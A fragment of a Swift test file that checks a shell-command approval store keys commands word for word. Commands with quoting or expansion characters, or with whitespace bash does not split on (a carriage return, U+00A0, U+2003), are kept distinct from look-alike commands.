    func aCommandThatCarriesShellQuotingKeysWordForWord() {
        // To decide what a quote encloses means to lex the shell, and a lexer
        // that is a little wrong gives approvals that the user never gave. Thus
        // the store collapses nothing the moment a quoting, escape, or
        // expansion character appears. That costs one more question at worst.
        for command in ["echo \"a\"", "echo 'a'", "echo `a`", "echo a\\ b", "echo $a"] {
            let spaced = command.replacingOccurrences(of: "echo ", with: "echo  ")
            #expect(
                ShellDecisionStore.matchKey(for: command)
                    != ShellDecisionStore.matchKey(for: spaced),
                Comment(rawValue: "expected \(command.debugDescription) keyed word for word"))
        }
    }

    /// A command that carries whitespace that bash does not split words on,
    /// with the command that the text collapses to if the store removes it.
    struct NonSeparatorWhitespacePair: Sendable {
        /// The command that carries the character.
        let carrying: String
        /// The command that it must not become.
        let plain: String
        /// Why the character is part of an argument and not separation.
        let why: String
    }

    @Test(
        "The key keeps whitespace that the shell does not split on",
        arguments: [
            // The default IFS of bash is space, tab, newline. A carriage return
            // is NOT in it, thus a carriage return at the end belongs to the
            // word before it. Examined: `rm foo<CR>` removes the file named
            // "foo\r", and not the file named "foo".
            NonSeparatorWhitespacePair(
                carrying: "rm foo\r", plain: "rm foo",
                why: "a carriage return at the end is part of the argument"),
            NonSeparatorWhitespacePair(
                carrying: "\rrm foo", plain: "rm foo",
                why: "a carriage return at the start is part of the command word"),
            NonSeparatorWhitespacePair(
                carrying: "echo a\u{00A0}", plain: "echo a",
                why: "U+00A0 is not IFS whitespace"),
            NonSeparatorWhitespacePair(
                carrying: "echo a\u{2003}", plain: "echo a",
                why: "the U+2000 block is not IFS whitespace"),
        ])
    func theKeyKeepsWhitespaceTheShellDoesNotSplitOn(_ pair: NonSeparatorWhitespacePair) {
        #expect(
            ShellDecisionStore.matchKey(for: pair.carrying)
                != ShellDecisionStore.matchKey(for: pair.plain),
            Comment(rawValue: pair.why))
    }
}
